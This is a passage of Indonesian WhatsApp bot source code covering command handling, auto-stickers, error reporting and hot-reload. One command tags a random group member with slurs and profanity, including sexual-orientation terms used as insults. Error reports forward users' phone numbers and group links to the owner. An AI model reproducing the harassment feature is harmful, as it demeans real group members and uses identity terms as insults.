case 'bodoh':
case 'gay':
case 'lesby':
case 'bajingan':
case 'jancok':
case 'anjing':
case 'ngentod':
case 'ngentot':
case 'monyet':
case 'mastah':
case 'newbie':
case 'bangsat':
case 'bangke':
case 'sange':
case 'sangean':
case 'dakjal':
case 'horny':
case 'wibu':
case 'puki':
case 'pantex':
case 'pantek': {
if (!isGroup) return onlyGroup() 
let member = participants.map(u => u.id)
let org = member[Math.floor(Math.random() * member.length)]
 conn.sendMessage(from, { text: `yang paling ${command} di sini adalah @${org.split("@")[0]}`, mentions: [org]}, { quoted: setQuoted }) 
}
break

case 'jadianime2':{
 if(!isQuotedImage) return setReply("Kirim gambar dengan caption .jadianime atau reply gambar")
  setReply(mess.wait)
let media = await conn.downloadAndSaveMediaMessage(quoted)
let anu = await TelegraPh(media)

conn.sendMedia(from, `https://api.lolhuman.xyz/api/imagetoanime?apikey=${apikey}&img=${anu}`, m)
}
break

case 'clearerror':
if (!isOwner) return onlyOwner()
setReply("SukseS clear all error")
_error.clear(listerror)
break
case 'clearuser':
if (!isOwner) return onlyOwner()
setReply("Sukses clear all User")
db.data.users = {}
break
case 'clearban':{
if (!isOwner) return onlyOwner()
setReply("Sukses clear all Ban")
ban.length = 0
}
break


//------------------------ BATAS DARI AREA CASE -----------------------------\\   
    
default:
if (isCmd) {
await _data.Nothing(toFirstCase(command), dash, allcommand)
const stringSimilarity = require("string-similarity");
let matches = await stringSimilarity.findBestMatch(toFirstCase(command), allcommand)
setReply(`Command *${prefix+command}* tidak ditemukan\nMungkin yang kamu maksud adalah *${prefix+matches.bestMatch.target.toLowerCase()}*`)
} 


    
}//Akhir switch command

    
//Auto sticker  
if (isImage && autoSticker) {
try{
let WSF = require('wa-sticker-formatter')
let wsf = false
let mime = (m.msg || m).mimetype || ''
if (/image/.test(mime)) {
let img = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
wsf = new WSF.Sticker(img, {
pack: packName,
type: WSF.StickerTypes.FULL,
author: authorName,
crop: true,
})
}        
if (wsf) {
await wsf.build()
const sticBuffer = await wsf.get()
if (sticBuffer) await conn.sendMessage(from, { sticker: sticBuffer }, {
quoted: m,
mimetype: 'image/webp',
ephemeralExpiration: 86400
})
}
}catch(err){

}
}


//ketika ada yang invite/kirim link grup di chat pribadi
if ((type === 'groupInviteMessage' || budy.includes('https://chat') || budy.includes('Buka tautan ini')) && !m.isBaileys && !isGroup && !itsMe && !isOwner) {
let { dada } = require("../message/sewabot.js")
let teks = dada(prefix, pushname, ucapanWaktu)      
let gbutsan = [{buttonId: `${prefix}owner`, buttonText: {displayText: `ᴏᴡɴᴇʀ`}, type: 1},
{buttonId: `KODE QR`, buttonText: {displayText: `ᴋᴏᴅᴇ ϙʀ`}, type: 1}]  
conn.sendButLoc(from, teks,copyright, fs.readFileSync('./stik/thumb.jpeg'), gbutsan)
}

//User Private Chat
if (!isGroup && user && isPremium && new Date - user.pc < 86400000) {
} else if(!isGroup && user && isPremium && !itsMe) {
setReply( `Hai ${ucapanWaktu} kak *${pushname}*  ada yang bisa aku bantu ? silakan ketik ${prefix}menu`)
user.pc = new Date * 1
}
 



  





} catch (err){
Log(err)
//add to dashboard
if(isCmd) _data.Failed(toFirstCase(command), dash)
let e = util.format(err)
if(err.message.includes("Cannot find module")){
let module = err.message.split("Cannot find module '")[1].split("'")[0]
let teks = `Module ${module} belom di install
silakan klik tombol install di bawah terlebih dahulu`
let mok = [{"buttonId": `${prefix}exec npm i ${module}`,"buttonText": {"displayText": `Install`},"type": "RESPONSE"},
          {"buttonId": `${prefix}report module ${module} belom di install`,"buttonText": {"displayText": `Report`},"type": "RESPONSE"}]
let nono = {
  text: teks,
  footer: `${copyright}\n${calender}`,
  buttons: mok,
  headerType: 1
  }
  
  return await conn.sendMessage(m.key.remoteJid, nono , {quoted: m})
}
await setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n© ${fake1}`) 
if(_error.check(err.message, db.data.listerror)) return
_error.add(err.message, command, db.data.listerror)
if(autoblockcmd){        
_blockcmd.add(command,listcmdblock) 
await setReply("Command telah di block karena terjadi error")
} 
  
if(autoReport){
if(isQuotedImage){
var media =  "Reply Image ✅"
}else if(isQuotedVideo){
var media = "Reply Video ✅"
} else if(isQuotedSticker){ 
var media = "Reply Sticker ✅"
} else if(isQuotedAudio){
var media = "Reply Audio ✅"
} else if(isQuotedTeks){
var media =  "Reply Teks ✅"
} else if(isQuotedTag){
var media =  "Reply Tag ✅"
} else {
var media = "No Quoted ❌"
}

if(q.length > "0"){
var tetek = q
} else if(q.length == "0"){
var tetek = "No Query ❌"
}

if (isGroup && isBotGroupAdmins) {
let linkgc = await conn.groupInviteCode(from)
var yeh = `https://chat.whatsapp.com/${linkgc}`
} else if(isGroup && !isBotGroupAdmins){
var yeh = `Botz Is Not Admin`
} else if(!isGroup){
var yeh = `Botz Is Not In The Group`
} 

let teks =`\n*]───── 「 Laporan Bug ⚠️」 ─────[*\n\n👤 Nama : ${pushname}\n📳 Nomer : wa.me/${senderNumber}\n📢 Info Laporan :\n       _${e}_\n🔖 Command : ${prefix}${command}\n⏰Time : ${timeWib} Wib\n📝 Query : ${tetek}\n🧩 Quoted : ${media}\n💠 Group : ${isGroup?`${groupName}`:'Di private chat'}\n🆔 ID : ${from}\n🌐 Link Group : ${yeh}\n\n\n`
let mok = [{"buttonId": `${prefix}banuser ${sender}`,"buttonText": {"displayText": `ʙᴀɴɴᴇᴅ`},"type": "RESPONSE"},
                    {"buttonId": `${prefix}thanksuser ${sender}`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"}]
let tolol = {
text: teks,
footer: `${copyright}\n${calender}`,
buttons: mok,
headerType: 1
}

await conn.sendMessage(Ownerin, tolol , {quoted: fkontak})

if(!autoblockcmd){
await conn.sendMessage(from,{ text: "Laporan error telah dikirim ke Developer Botz"})
}

if(isQuotedSticker || isQuotedImage || isQuotedVideo || isQuotedAudio ){
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
await conn.sendMedia (Ownerin, media, m, {caption: "System Error"})
await fs.unlinkSync(media)
}

} 
}		

} catch(err){
Log(err)
console.log(chalk.bgRed(chalk.black("[  ERROR  ]")),util.format(err))
let e = String(err) 
if (e.includes("this.isZero")) {return}
if (e.includes("rate-overlimit")) {
if(!publik) return
publik = false
await conn.sendMessage(nomerOwner+"@s.whatsapp.net",{ 
text: `Terjadi rate-overlimit
Bot telah mengganti dari mode Public ke mode Self
Untuk menghindari spam yang berlebihan,
Silakan tunggu 1 menit hingga semua pesan
telah terbaca oleh bot`
})
await setTimeout(() => {
publik = true
 conn.sendMessage(nomerOwner+"@s.whatsapp.net",{ 
text: `Berhasil mengubah mode self ke mode public`
})
}, 60000)
return
}
if (e.includes('Connection Closed')){ return }
if (e.includes('Timed Out')){ return }
if (e.includes('Value not found')){ return }
console.log(chalk.white('Message Error : %s'), chalk.green(util.format(e)))
}
  
}//Akhir export default

const __filename = new URL('', import.meta.url).pathname
//const __dirname = new URL('.', import.meta.url).pathname
let file = fileURLToPath(import.meta.url)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.bgGreen(chalk.black("[  UPDATE ]")),chalk.white(`${__filename}`) )
delRequireCache(file)
delete require.cache[file]
import(`${file}?update=${Date.now()}`)
})

//========================//

// SCRIPT BY : LANA DEV
// EROR?? WA : 085773089737
// JANGAN DI HAPUS ASU
// JUAL SCRIPT NERAKA PALING BAWAH

//===================//

/*
  SCRIPT BY : LANA DEV & Dittaz
  EROR?? CHAT GROUP : https://chat.whatsapp.com/JgJHpvM7K6UAYVlT2zQPFA
  Youtube : https://youtube.com/@maulanabot
  JANGAN DI HAPUS ASU
  JUAL SCRIPT?? NERAKA PALING BAWAH
*/

//========================//

// SCRIPT BY : LANA DEV
// EROR?? WA : 085773089737
// JANGAN DI HAPUS ASU
// JUAL SCRIPT NERAKA PALING BAWAH

//===================//